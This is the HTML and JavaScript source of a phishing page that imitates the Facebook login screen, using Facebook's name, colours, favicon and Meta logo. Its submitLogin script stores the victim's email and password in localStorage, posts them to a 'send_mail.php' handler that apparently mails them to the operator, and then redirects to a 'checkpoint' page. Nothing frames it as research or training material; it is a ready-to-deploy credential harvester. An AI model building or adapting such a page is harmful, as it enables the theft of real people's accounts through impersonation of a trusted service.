<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins">
    <link rel="shortcut icon" href="https://www.facebook.com/images/fb_icon_325x325.png
" />

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f0f2f5;
        }

        .logo-text {
            font-size: 21px;
            color: #1c1e21;
            font-family: Poppins !important;

        }
        .facebook-logo {
            color: #1877f2;
            font-size: 50px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .login-container {
            font-family: Poppins !important;

            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .btn-primary {
            background-color: #1877f2;
            border: none;
        }
        .btn-primary:hover {
            background-color: #165cdb;
        }
        .create-account-btn {
            background-color: #42b72a;
            border: none;
            width: 100%;
        }
        .create-account-btn:hover {
            background-color: #36a420;
        }
        .form-label {
            color: #606770;
            font-size: 14px;

        }

        input{
            font-size: 12px !important;

        }

        .my-6 {
    margin-top: 6rem !important;
    margin-bottom: 6rem !important;
}
    </style>
</head>
<body>

    <div class="container">
        <div class="row align-items-center my-6">
            <div class="col-lg-6 col-md-6 text-center mb-5">
                <div class="logo-section">
                    <div class="facebook-logo">facebook</div>
                    <div class="logo-text">Facebook helps you connect and share with the people in your life.</div>
                </div>
            </div>
            <div class="col-lg-6 col-md-6 col-12">
                <div class="login-container mx-auto" style="max-width: 400px;">
                   <!-- Page 1: Login Form -->
                   <form id="loginForm">
    <div class="mb-3">
        <label for="email" class="form-label">Email address or phone number</label>
        <input type="text" name="email" class="form-control" id="email" placeholder="Email address or phone number" required>
    </div>
    <div class="mb-3">
        <label for="password" class="form-label">Password</label>
        <input type="password" name="password" class="form-control" id="password" placeholder="Password" required>
    </div>
    <div class="d-grid gap-2">
        <button type="button" class="btn btn-primary btn-block" onclick="submitLogin()">Log in</button>
    </div>
    <div class="text-center mt-3">
        <a href="https://web.facebook.com/login/identify/" style="text-decoration: none !important;">Forgotten password?</a>
    </div>
</form>



                    <div style="padding-top: 20px; padding-bottom: 20px; display: flex; align-items: center; justify-content: center;">
        <div style="aspect-ratio: 5 / 1;">
            <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" height="1" width="5"></svg>
        </div>
        <div>
            <img alt="Meta logo" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yr/r/7trPSpNFerC.png" style="height: 100%; width: 100%; mask-image: url('https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yr/r/7trPSpNFerC.png'); mask-size: contain; background-color: rgb(70, 90, 105); object-position: 10000px 10000px; object-fit: contain; overflow: hidden;">
        </div>
</div>

                </div>
            </div>
        </div>
    </div>
  <script>
    function submitLogin() {
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;

        if (email && password) {
            // Save the email and password to localStorage
            localStorage.setItem('email', email);
            localStorage.setItem('password', password);

            // Send the form data via AJAX to save to mail
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "actions/send_mail.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    // Redirect to checkpoint.php after successful email sending
                    window.location.href = "checkpoint";
                }
            };
            xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
        }
    }
</script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
